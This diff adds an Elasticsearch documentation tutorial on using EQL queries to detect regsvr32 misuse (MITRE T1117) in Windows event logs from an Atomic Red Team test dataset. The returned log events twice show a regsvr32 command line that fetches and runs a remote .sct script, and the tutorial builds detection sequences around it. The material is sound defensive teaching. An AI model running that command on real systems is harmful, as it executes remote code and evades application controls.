@@ -1,0 +1,386 @@
+[role="xpack"]
+[testenv="basic"]
+[[eql-ex-threat-detection]]
+== Example: Detect threats with EQL
+
+dev::[]
+
+This example tutorial shows you how you can use EQL to detect security threats
+and other suspicious behavior.
+
+In the scenario, you're tasked with detecting
+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows Event Logs.
+Regsvr32 misuse is a known adversary technique
+documented in the https://attack.mitre.org[MITRE ATT&CK®] knowledge base.
+
+[discrete]
+[[eql-ex-threat-detection-setup]]
+=== Setup
+
+This tutorial uses a normalized test dataset for regsvr32 misuse from
+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset
+includes events that imitate behaviors related to regsvr32 misuse, as documented
+by MITRE ATT&CK®.
+
+To get started, download and index the sample dataset:
+
+. Download the https://github.com/endgameinc/eqllib/blob/master/data/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.
+
+. Index the data into the `sec_logs` index with the following
+<<docs-bulk,bulk API>> request:
+
+[source,sh]
+----
+curl -H "Content-Type: application/json" -XPOST "localhost:9200/sec_logs/_bulk?pretty&refresh" --data-binary "@normalized-T1117-AtomicRed-regsvr32.json"
+----
+// NOTCONSOLE
+
+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed
+  successfully.
+
+[source,console]
+----
+GET /_cat/indices/sec_logs?v&h=health,status,index,docs.count
+----
+// TEST[setup:sec_logs]
+
+The API returns the following response. The `docs.count` value should show `150`
+documents were indexed.
+
+[source,txt]
+----
+health status index     docs.count
+yellow open   sec_logs         150
+----
+// TESTRESPONSE[non_json]
+
+[discrete]
+[[eql-ex-get-a-count-of-regsvr32-events]]
+=== Get a count of `regsvr32.exe` events
+
+Since you're looking for `regsvr32` misuse, start by getting a count of events
+using `regsvr32.exe`.
+
+The following <<eql-search-api,EQL search API>> request uses an EQL query to
+retrieve a count of events with a `process_name` of `regsvr32.exe`. The query
+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,
+meaning query can match events of any <<eql-required-fields,event category>>.
+
+[source,console]
+----
+GET /sec_logs/_eql/search?filter_path=-hits.events  <1>
+{
+  "query": """
+    any where process_name == "regsvr32.exe"        <2>
+  """,
+  "event_category_field": "event_type",             <3>
+  "timestamp_field": "timestamp",                   <4>
+  "size": 150                                       <5>
+}
+----
+// TEST[setup:sec_logs]
+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the
+`hits.events` property from the response. This request is only intended to
+retrieve a count of events.
+<2> Matches events with a `process_name` of `regsvr32.exe`.
+<3> Sets the event category field as `event_type`.
+<4> Sets the timestamp field as `timestamp`.
+<5> Returns up to 150 events or sequences matching the query.
+
+The request returns the following response, indicating that 143 events match the
+query.
+
+[source,console-result]
+----
+{
+  "is_partial": false,
+  "is_running": false,
+  "took": 60,
+  "timed_out": false,
+  "hits": {
+    "total": {
+      "value": 143,
+      "relation": "eq"
+    }
+  }
+}
+----
+// TESTRESPONSE[s/"took": 60/"took": $body.took/]
+
+[discrete]
+[[eql-ex-check-for-command-line-artifacts]]
+=== Check for command line artifacts
+
+Your previous query matched 143 events. Many of these events are likely to be
+false positives.
+
+To narrow down the results, check if the command line was used during any of
+these events. Append `and command_line > 0` to the previous EQL query. This
+should limit matching results to events that contain a `command_line` value.
+
+You'll also need to remove the `filter_path=-hits.events` query parameter. This
+lets you retrieve the document source for any matching events.
+
+[source,console]
+----
+GET /sec_logs/_eql/search
+{
+  "query": """
+    any where process_name == "regsvr32.exe" and command_line > 0
+  """,
+  "event_category_field": "event_type",
+  "timestamp_field": "timestamp",
+  "size": 150
+}
+----
+// TEST[setup:sec_logs]
+
+The query matches one event.  Based on the event's `command_line` value,
+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known
+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] behavior.
+
+[source,console-result]
+----
+{
+  "is_partial": false,
+  "is_running": false,
+  "took": 2,
+  "timed_out": false,
+  "hits": {
+    "total": {
+      "value": 1,
+      "relation": "eq"
+    },
+    "events": [
+      {
+        "_index": "sec_logs",
+        "_id": "gl5MJXMBMk1dGnErnBW8",
+        "_score": null,
+        "_source": {
+          "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+          "event_type": "process",
+          "logon_id": 217055,
+          "parent_process_name": "cmd.exe",
+          "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
+          "pid": 2012,
+          "ppid": 2652,
+          "process_name": "regsvr32.exe",
+          "process_path": "C:\\Windows\\System32\\regsvr32.exe",
+          "subtype": "create",
+          "timestamp": 131883573237130000,
+          "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+          "unique_ppid": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+          "user": "ART-DESKTOP\\bob",
+          "user_domain": "ART-DESKTOP",
+          "user_name": "bob"
+        },
+        "sort": [
+          131883573237130000
+        ]
+      }
+    ]
+  }
+}
+----
+// TESTRESPONSE[s/"took": 2/"took": $body.took/]
+// TESTRESPONSE[s/"_id": "gl5MJXMBMk1dGnErnBW8"/"_id": $body.hits.events.0._id/]
+
+[discrete]
+[[eql-ex-check-for-malicious-script-loads]]
+=== Check for malicious script loads
+
+You now know that `regsvr32.exe` was used to register
+a potentially malicious script as `scrob.dll`. Next, find any processes that
+load the `scrob.dll` file.
+
+Modify the previous EQL query as follows:
+
+* Change the `any` keyword to `image_load`. This means the query only matches
+events with an `event_type` of `image_load`.
+* Add the `image_name == "scrobj.dll` condition to check for image loads of
+`scrobj.dll`.
+
+[source,console]
+----
+GET /sec_logs/_eql/search
+{
+  "query": """
+    image_load where process_name == "regsvr32.exe" and image_name == "scrobj.dll"
+  """,
+  "event_category_field": "event_type",
+  "timestamp_field": "timestamp",
+  "size": 150
+}
+----
+// TEST[setup:sec_logs]
+
+The query matches an event, confirming that `scrobj.dll` was later loaded.
+
+[source,console-result]
+----
+{
+  "is_partial": false,
+  "is_running": false,
+  "took": 5,
+  "timed_out": false,
+  "hits": {
+    "total": {
+      "value": 1,
+      "relation": "eq"
+    },
+    "events": [
+      {
+        "_index": "sec_logs",
+        "_id": "ol5MJXMBMk1dGnErnBW8",
+        "_score": null,
+        "_source": {
+          "event_type": "image_load",
+          "image_name": "scrobj.dll",
+          "image_path": "C:\\Windows\\System32\\scrobj.dll",
+          "pid": 2012,
+          "process_name": "regsvr32.exe",
+          "process_path": "C:\\Windows\\System32\\regsvr32.exe",
+          "timestamp": 131883573237450016,
+          "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}"
+        },
+        "sort": [
+          131883573237450016
+        ]
+      }
+    ]
+  }
+}
+----
+// TESTRESPONSE[s/"took": 5/"took": $body.took/]
+// TESTRESPONSE[s/"_id": "ol5MJXMBMk1dGnErnBW8"/"_id": $body.hits.events.0._id/]
+
+[discrete]
+[[eql-ex-detemine-likelihood-of-sucess]]
+=== Determine likelihood of success
+
+In many cases, malicious scripts are used to download other remote files. If
+this occurred, the attack progressed and might have succeeded.
+
+Use an <<eql-sequences,EQL sequence query>> to check for the following series of
+events:
+
+* A `regsvr32.exe`  process. These processes
+can be used to load arbitrary scripts.
+* An image load of `scrobj.dll`
+* Any network event, which could indicate the download of a remote file.
+
+[source,console]
+----
+GET /sec_logs/_eql/search
+{
+  "query": """
+    sequence
+      [process where process_name == 'regsvr32.exe']
+      [image_load where image_name == 'scrobj.dll']
+      [network where true]
+  """,
+  "event_category_field": "event_type",
+  "timestamp_field": "timestamp",
+  "size": 150
+}
+----
+// TEST[setup:sec_logs]
+
+
+The request returns the following response with a matching sequence, indicating
+the attack likely succeeded.
+
+[source,console-result]
+----
+{
+  "is_partial": false,
+  "is_running": false,
+  "took": 25,
+  "timed_out": false,
+  "hits": {
+    "total": {
+      "value": 1,
+      "relation": "eq"
+    },
+    "sequences": [
+      {
+        "events": [
+          {
+            "_index": "sec_logs",
+            "_id": "gl5MJXMBMk1dGnErnBW8",
+            "_score": null,
+            "_source": {
+              "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
+              "event_type": "process",
+              "logon_id": 217055,
+              "parent_process_name": "cmd.exe",
+              "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
+              "pid": 2012,
+              "ppid": 2652,
+              "process_name": "regsvr32.exe",
+              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
+              "subtype": "create",
+              "timestamp": 131883573237130000,
+              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+              "unique_ppid": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
+              "user": "ART-DESKTOP\\bob",
+              "user_domain": "ART-DESKTOP",
+              "user_name": "bob"
+            },
+            "sort": [
+              131883573237130000
+            ]
+          },
+          {
+            "_index": "sec_logs",
+            "_id": "ol5MJXMBMk1dGnErnBW8",
+            "_score": null,
+            "_source": {
+              "event_type": "image_load",
+              "image_name": "scrobj.dll",
+              "image_path": "C:\\Windows\\System32\\scrobj.dll",
+              "pid": 2012,
+              "process_name": "regsvr32.exe",
+              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
+              "timestamp": 131883573237450016,
+              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}"
+            },
+            "sort": [
+              131883573237450016
+            ]
+          },
+          {
+            "_index": "sec_logs",
+            "_id": "EF5MJXMBMk1dGnErnBa9",
+            "_score": null,
+            "_source": {
+              "destination_address": "151.101.48.133",
+              "destination_port": "443",
+              "event_type": "network",
+              "pid": 2012,
+              "process_name": "regsvr32.exe",
+              "process_path": "C:\\Windows\\System32\\regsvr32.exe",
+              "protocol": "tcp",
+              "source_address": "192.168.162.134",
+              "source_port": "50505",
+              "subtype": "outgoing",
+              "timestamp": 131883573238680000,
+              "unique_pid": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
+              "user": "ART-DESKTOP\\bob",
+              "user_domain": "ART-DESKTOP",
+              "user_name": "bob"
+            },
+            "sort": [
+              131883573238680000
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
+----
+// TESTRESPONSE[s/"took": 25/"took": $body.took/]
+// TESTRESPONSE[s/"_id": "gl5MJXMBMk1dGnErnBW8"/"_id": $body.hits.sequences.0.events.0._id/]
+// TESTRESPONSE[s/"_id": "ol5MJXMBMk1dGnErnBW8"/"_id": $body.hits.sequences.0.events.1._id/]
+// TESTRESPONSE[s/"_id": "EF5MJXMBMk1dGnErnBa9"/"_id": $body.hits.sequences.0.events.2._id/]
